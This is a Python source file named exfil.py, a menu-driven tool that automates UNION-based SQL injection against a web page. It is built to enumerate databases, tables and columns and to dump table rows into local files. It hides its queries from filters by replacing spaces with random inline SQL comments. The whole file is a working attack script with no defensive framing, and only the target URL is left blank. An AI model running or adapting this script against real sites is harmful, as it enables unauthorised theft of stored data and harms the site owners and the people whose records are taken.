#!/usr/bin/python3
#codeName: exfil.py
#Author: Dahir Muhammad Dahir
#Date: 04th-December-2018
#About: to for exfiltrating data through sql injection and
#       storing the data in a structured manner for later use

import os
import re
import requests
from random import sample
from string import digits, ascii_letters as letters
from bs4 import BeautifulSoup as bs

headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) \
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"}

thisDir = os.getcwd()
characters = digits + letters
shell_char = "\n\nroot@dmd:~# "
projectDir = thisDir+"/exfil_projects"
db_file = projectDir+"/databases.dmd"
tbl_file = projectDir+"/tables.dmd"
col_file = projectDir+"/columns.dmd"
row_file = projectDir+"/rows.dmd"
row_pattern = re.compile(r"staff\.php\?id=")

def main():
    initialize_projects_folder() # initialize projects director if not existing
    begin()


def initialize_projects_folder():
    if not os.path.isdir(projectDir):
        os.mkdir(projectDir)

        with open(db_file, "w"):
            pass
        
        with open(tbl_file, "w"):
            pass
        
        with open(col_file, "w"):
            pass
        
        with open(row_file, "w"):
            pass


def begin():
    while(True):
        task = input("Welcome, what would you like to do:\n[1]=> retrieve database name\n[2]=> retrieve table name\n[3]=> retrieve column name\n[4]=> retrieve table row contents\n[5]=> auto pilot\n[6]=> quit%s"%(shell_char))
        
        if task == "1":
            retrieve_db_name()
        elif task == "2":
            retrieve_tbl_name()
        elif task == "3":
            retrieve_col_name()
        elif task == "4":
            retrieve_tbl_row_content()
        elif task == "5":
            auto_pilot()
        elif task == "6":
            exit()
        else:
            print("invalid input...please check your input!")


def retrieve_db_name():
    while(True):
        task = input("\n[1]=> show already retrieved database\n[2]=> retrieve new database name\n[3]=> back to previous menu%s"%(shell_char))
        if task == "1":
            show_file_content(db_file)
        elif task == "2":
            retrieve_new_db_name()
        elif task == "3":
            break
        else:
            print("invalid input...")


def retrieve_new_db_name():
    pre_column_name = "DISTINCT"
    column_name = "table_schema"
    from_where = "from information_schema.tables".replace(' ', get_rand_string())
    condition = "where table_schema not like '%_schema' and table_schema != 'mysql'".replace(' ', get_rand_string())
    result = queryDB(column_name, pre_column_name, from_where, condition)

    if not os.path.exists(db_file):
        with open(db_file, "w"):
            pass

    with open(db_file, "r") as f:
        lines = f.readlines()
    
    clean_lines = []
    for line in lines:
        clean_lines.append(line.strip("\n").strip("\r"))
    
    with open(db_file, "a") as f:
        for item in result:
            if item in clean_lines:
                pass
            else:
                f.write(item+"\n")
                print(item)



def retrieve_tbl_name():
    db_name = get_db_name()

    if db_name:
        db_table_file = projectDir+"/{}_tables.dmd".format(db_name)
        init_file(db_table_file)
        print("using {} database...".format(db_name))
    
        while True:
            task = input("\n[1]=> show already retrieved tables\n[2]=> retrieve tables from database\n[3]=> back to previous menu%s"%(shell_char))
            if task == "1":
                show_file_content(db_table_file)
            elif task == "2":
                retrieve_new_tables(db_name, db_table_file)
            elif task == "3":
                break
            else:
                print("invalid input...")
    else:
        print("No available database...")


def retrieve_new_tables(db_name, db_table_file):
    pre_column_name = ""
    column_name = "table_name"
    from_where = "from information_schema.tables".replace(' ', get_rand_string())
    condition = "where table_schema='{}'".replace(' ', get_rand_string()).format(db_name)
    result = queryDB(column_name, pre_column_name, from_where, condition)

    if not os.path.exists(db_table_file):
        with open(db_table_file, "w"):
            pass

    lines = []
    with open(db_table_file, "r") as f:
        lines = f.readlines()
    
    clean_lines = []
    for line in lines:
        clean_lines.append(line.strip("\n").strip("\r"))
    
    with open(db_table_file, "a") as f:
        for item in result:
            if item in clean_lines:
                pass
            else:
                f.write(item+"\n")
                print(item)


def get_db_name():
    with open(db_file, "r") as f:
        lines = f.readlines()
    
    available_db = []
    if lines:
        for line in lines:
            available_db.append(line.strip("\n").strip("\r"))
        
        while True:
            print("\nselect the database you want to use:\n")
            for i in range(len(available_db)):
                print("[{}]=> {}".format(i, available_db[i]))
            
            try:
                selected_db = available_db[int(input("{}".format(shell_char)))]
                return selected_db
            except Exception:
                print("invalid input...check your input")
    else:
        return False


def retrieve_col_name():
    db_name = get_db_name()
    if db_name:
        db_table_file = projectDir+"/{}_tables.dmd".format(db_name)
        tbl_name = get_tbl_name(db_table_file)

        if tbl_name:
            tbl_columns_file = projectDir+"/{}_columns.dmd".format(tbl_name)
            init_file(tbl_columns_file)
            print("using {} table...".format(tbl_name))
        
            while True:
                task = input("\n[1]=> show already retrieved columns\n[2]=> retrieve columns from database\n[3]=> back to previous menu%s"%(shell_char))
                if task == "1":
                    show_file_content(tbl_columns_file)
                elif task == "2":
                    retrieve_new_columns(tbl_name, tbl_columns_file)
                elif task == "3":
                    break
                else:
                    print("invalid input...")
        else:
            print("No available table...")
    else:
        print("No available database...")


def get_tbl_name(db_table_file):
    with open(db_table_file, "r") as f:
        lines = f.readlines()
    
    available_tbl = []
    if lines:
        for line in lines:
            available_tbl.append(line.strip("\n").strip("\r"))
        
        while True:
            print("\nselect the table you want to use:\n")
            for i in range(len(available_tbl)):
                print("[{}]=> {}".format(i, available_tbl[i]))
            
            try:
                selected_tbl = available_tbl[int(input("{}".format(shell_char)))]
                return selected_tbl
            except Exception:
                print("invalid input...check your input")
    else:
        return False


def retrieve_new_columns(tbl_name, tbl_columns_file):
    pre_column_name = ""
    column_name = "column_name"
    from_where = "from information_schema.columns".replace(' ', get_rand_string())
    condition = "where table_name='{}'".replace(' ', get_rand_string()).format(tbl_name)
    result = queryDB(column_name, pre_column_name, from_where, condition)

    if not os.path.exists(tbl_columns_file):
        with open(tbl_columns_file, "w"):
            pass

    lines = []
    with open(tbl_columns_file, "r") as f:
        lines = f.readlines()
    
    clean_lines = []
    for line in lines:
        clean_lines.append(line.strip("\n").strip("\r"))
    
    with open(tbl_columns_file, "a") as f:
        for item in result:
            if item in clean_lines:
                pass
            else:
                f.write(item+"\n")
                print(item)


def retrieve_tbl_row_content():
    db_name = get_db_name()
    if db_name:
        db_table_file = projectDir+"/{}_tables.dmd".format(db_name)
        if not os.path.exists(db_table_file):
            retrieve_new_tables(db_name, db_table_file)
        tbl_name = get_tbl_name(db_table_file)

        if tbl_name:
            tbl_columns_file = projectDir+"/{}_columns.dmd".format(tbl_name)
            if not os.path.exists(tbl_columns_file):
                retrieve_new_columns(tbl_name, tbl_columns_file)
            columns_name = get_columns_name(tbl_columns_file)

            if columns_name:
                tbl_rows_file = projectDir+"/{}_rows.dmd".format(tbl_name)
                init_file(tbl_rows_file)
                print("using {} table...".format(tbl_name))
            
                while True:
                    task = input("\n[1]=> show already retrieved table contents\n[2]=> retrieve table rows from database\n[3]=> back to previous menu%s"%(shell_char))
                    if task == "1":
                        show_file_content(tbl_rows_file)
                    elif task == "2":
                        retrieve_tbl_rows(db_name, tbl_name, columns_name, tbl_rows_file)
                    elif task == "3":
                        break
                    else:
                        print("invalid input...")
            else:
                print("No available columns...")
        else:
            print("No available table...")
    else:
        print("No available database...")


def get_columns_name(tbl_columns_file):
    with open(tbl_columns_file, "r") as f:
        lines = f.readlines()
    
    available_columns = []
    if lines:
        for line in lines:
            available_columns.append(line.strip("\n").strip("\r"))
        
        while True:
            print("\nselect the columns you want to use [ comma separated as in [1,2,3]]:\n")
            for i in range(len(available_columns)):
                print("[{}]=> {}".format(i, available_columns[i]))
            print("[*]=> Select All")
            
            selected_columns = []
            try:
                selected_column_nums = input("{}".format(shell_char)).split(",")
                if selected_column_nums[0] == "*":
                    selected_columns = available_columns
                    return selected_columns
                else:
                    for num in selected_column_nums:
                        selected_columns.append(available_columns[int(num)])
                    return selected_columns
            except Exception:
                print("invalid input...check your input")
    else:
        return False


def init_file(filename):
    if not os.path.exists(filename):
        with open(filename, "w"):
            pass


def show_file_content(file_name):
    lines = []
    with open(file_name, "r") as f:
        lines = f.readlines()
    
    if lines:
        for line in lines:
            print("[*] {}".format(line.strip("\n").strip("\r")))
    else:
        print("file is empty...")


def retrieve_tbl_rows(db_name, tbl_name, columns_name, tbl_rows_file):
    column_name_string = ""
    for column in columns_name:
        column_name_string += "'{}',".format(column)
        if column != columns_name[-1]:
            column_name_string += "{},".format(column)
        else:
            column_name_string += "{}".format(column)
    pre_column_name = ""
    column_name = "concat_ws('::',{})".format(column_name_string)
    from_where = "from {}.{}".replace(' ', get_rand_string()).format(db_name, tbl_name)
    condition = "{}".format(input("enter condition{}".format(shell_char))).replace(' ', get_rand_string())
    result = queryDB(column_name, pre_column_name, from_where, condition)

    lines = []
    with open(tbl_rows_file, "r") as f:
        lines = f.readlines()
    
    clean_lines = []
    for line in lines:
        clean_lines.append(line.strip("\n").strip("\r"))
    
    with open(tbl_rows_file, "a") as f:
        for item in result:
            if item in clean_lines:
                pass
            else:
                f.write(item+"\n")
                print(item)


def auto_pilot():
    pass


def queryDB(column_name, pre_column_name="", from_where="", condition=""):
    query = "xzqs' UNION SELECT {} 1,{},3,4,5,6,7,8,9,10,11,12,13,14,15 {} {} -- a".replace("- a", "-ayilar").replace(' ', get_rand_string()).replace('-ayilar', '- a').format(pre_column_name, column_name, from_where, condition)
    host_url = ""

    with requests.Session() as s:
        page = s.get(host_url+query).content
        #print(host_url+query)
        
    rows = []
    soup = bs(page, "html.parser")
    clean = soup.prettify("utf8")
    soup = bs(clean, "html.parser")
    
    a_tags = soup.find_all("a", attrs={"href":row_pattern})
    for tag in a_tags:
        soup = bs(str(tag), "html.parser")
        row = soup.find("a").string
        row = row.strip("\n").strip(" ").strip("\n").strip("\n")
        rows.append(row)
    return rows


# generate and return a random string in the format /*random_string*/
def get_rand_string():
    rand_string = sample(characters, 6)
    return '/*'+"".join(rand_string)+'*/'



if __name__=="__main__":
    main()